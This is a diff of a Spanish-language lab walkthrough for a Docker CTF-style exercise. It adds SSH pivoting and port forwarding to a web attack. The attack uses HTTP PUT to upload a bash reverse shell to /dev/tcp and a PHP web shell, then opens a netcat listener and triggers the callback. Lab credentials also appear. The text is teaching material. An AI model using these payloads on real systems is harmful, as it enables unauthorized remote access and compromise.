@@ -7,22 +7,39 @@
 ---
 
 ## 🎯 Objetivo
-- Obtener acceso inicial a la máquina objetivo.
-- Leer la flag de usuario ubicada en `/home/sickos/user.txt`.
-- Escalar privilegios hasta **root**.
-- Leer la flag final ubicada en `/root/root.txt`.
+1. **Acceso al entorno:** Conectarse a la máquina de salto (Pivote).
+2. **Pivoting:** Atacar la máquina víctima (web-machine) desde dentro de la red.
+3. **Compromiso:** Obtener acceso, robar credenciales y escalar a root.
 
 ---
 
-## 🖥️ Preparativos (Máquina atacante)
-Para completar el laboratorio se requieren **dos terminales abiertas** en la máquina atacante (Linux/WSL):
+## 🖥️ Preparativos (Infraestructura de Red)
+La máquina víctima (`web-machine`) **no tiene puertos expuestos** hacia nuestro equipo anfitrión. Para acceder a ella, debemos utilizar técnicas de **Tunneling** y **Pivoting** a través del contenedor `attacker`.
 
-- **Terminal 1** 🧨: usada para reconocimiento y explotación (peticiones web, subida de ficheros).
-- **Terminal 2** 🎧: usada como listener para recibir la conexión inversa.
+### 1. Conexión al Pivote
+Iniciamos sesión mediante SSH en la máquina atacante (Debian) utilizando las credenciales del usuario sin privilegios (`dummy`). A partir de este momento, todas las herramientas de ataque se ejecutarán desde esta sesión remota.
+```bash
+ssh -p 2222 dummy@localhost
+# Password: palangana
+```
+*A partir de ahora, todos los comandos de ataque se ejecutan dentro de esta sesión SSH.*
+
+### 2. Habilitar Navegación Web (SSH Tunneling)
+Dado que el servidor web de la víctima solo es accesible desde la red interna de Docker, creamos un **Túnel SSH (Local Port Forwarding)**. Esto redirige un puerto de nuestro PC local hacia el puerto 80 de la víctima, pasando a través del pivote.
+```bash
+ssh -p 2222 -N -L 8080:web-machine:80 dummy@localhost
+```
+*Ahora es posible visualizar la aplicación web objetivo navegando a `http://localhost:8080` en nuestro navegador web habitual.*
 
 ---
 
 ## 🔎 FASE 1: Reconocimiento (Enumeración)
+A partir de este punto, operamos desde la terminal de la máquina atacante (Pivote). Docker resuelve el nombre de host web-machine automáticamente, lo que nos permite dirigir los ataques sin necesidad de averiguar la IP dinámica de la víctima.
+Para completar el ataque se requieren **dos terminales abiertas** en la máquina atacante:
+
+- **Terminal 1** 🧨: usada para reconocimiento y explotación (peticiones web, subida de ficheros).
+- **Terminal 2** 🎧: usada como listener para recibir la conexión inversa.
+
 El primer paso es identificar qué servicios están expuestos en la máquina objetivo y analizar su configuración. Dado que actuamos en modo "caja negra" (sin conocer la infraestructura), comenzamos con un escaneo general.
 
 ### 1. Escaneo de Puertos
@@ -31,8 +48,12 @@ Ejecutamos `nmap` contra la IP objetivo para descubrir puertos abiertos y versio
 ```bash
 nmap -p- -sV -sC localhost
 ```
+**Resultados del análisis:**
+- Se detecta un servicio **HTTP (Puerto 80)**.
+- Se detecta un servicio **SSH (Puerto 22)** estándar.
 
-Durante esta fase se analiza la superficie de ataque del servidor web.
+### 2. Enumeración Web
+Utilizamos herramientas de fuerza bruta de directorios desde la máquina atacante para descubrir rutas ocultas en el servidor web.
 
 ```bash
 wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt
@@ -40,23 +61,31 @@ gobuster dir -u http://localhost:8080 -w common.txt
 ```
 
 Se identifica que el directorio `/test/` es accesible y potencialmente vulnerable.
-El objetivo es comprobar si el servidor permite el método HTTP **PUT**, lo cual supondría una mala configuración de seguridad.
-### 📌 Comando
+
+### 3. Para comprobar si el servidor permite el método HTTP **PUT**, lo cual supondría una mala configuración de seguridad ejecutamos el siguiente comando:
 ```bash
 curl -v -X OPTIONS http://localhost:8080/test/
 ```
-Como el método **PUT** está habilitado, es posible subir archivos directamente al servidor, abriendo la puerta a la explotación.
+**Conclusión:** La configuración del servidor responde explícitamente permitiendo el método **PUT**. Esto representa una vulnerabilidad crítica que permite la subida arbitraria de archivos al servidor sin autenticación.
 
 ---
 
 ## 🔓 FASE 2: Acceso Inicial (Reverse Shell)
 Confirmada la vulnerabilidad, se procede a obtener acceso remoto al sistema.
 
-1. Se identifica la dirección IP de la máquina atacante, que actuará como destino de la conexión inversa.
+1. Se identifica la dirección IP de la máquina atacante y víctima, que actuará como destino de la conexión inversa.
 ```bash
 ip addr show eth0
 ```
 Copia tu IP obtenida e introdúcela donde veas TU_IP.
+
+Una vez conocemos nuestra IP hacemos un escaneo por la red de la IP para ver qué otras máquinas están conectadas.
+Por ejemplo, si tu IP es la 172.21.0.3/16, haremos un escaneo por la subred 172.21.0.0/16
+```bash
+nmap -sn TU_SURBED
+```
+Copia la IP obtenida e introdúcela donde veas VICTIM_IP.
+
 2. Se prepara un payload que fuerza al servidor a iniciar una **reverse shell**.
 ```bash
 echo "bash -i >& /dev/tcp/TU_IP/4444 0>&1" > rev.sh
@@ -67,13 +96,13 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 4. Ambos archivos se suben al directorio vulnerable `/test/` aprovechando el método PUT.
 ```bash
-curl -v -T rev.sh http://localhost:8080/test/rev.sh
-curl -v -T shell.php http://localhost:8080/test/shell.php
+curl -v -T rev.sh http://VICTIM_IP/test/rev.sh
+curl -v -T shell.php http://VICTIM_IP/test/shell.php
 ```
 4. Como alternativa, puedes subir los ficheros al directorio vulnerable sin crear archivos peligrosos en tu ordenador.
 ```bash
-curl -v -X PUT --data 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' http://localhost:8080/test/rev.sh
-curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://localhost:8080/test/shell.php
+curl -v -X PUT --data 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' http://VICTIM_IP/test/rev.sh
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://VICTIM_IP/test/shell.php
 ```
 5. En la terminal 2, se pone a la escucha en el puerto configurado en la **reverse shell** del paso 2.
 ```bash
@@ -81,7 +110,7 @@ nc -lvnp 4444
 ```
 6. Se ejecuta el archivo PHP, provocando que la víctima se conecte de vuelta.
 ```bash
-curl "http://localhost:8080/test/shell.php?cmd=bash%20/var/www/html/test/rev.sh"
+curl "http://VICTIM_IP/test/shell.php?cmd=bash%20/var/www/html/test/rev.sh"
 ```
 Como resultado, se obtiene una shell con el usuario **www-data**, con privilegios limitados.
 7. Navega hasta el directorio donde se encuentra la primera flag.
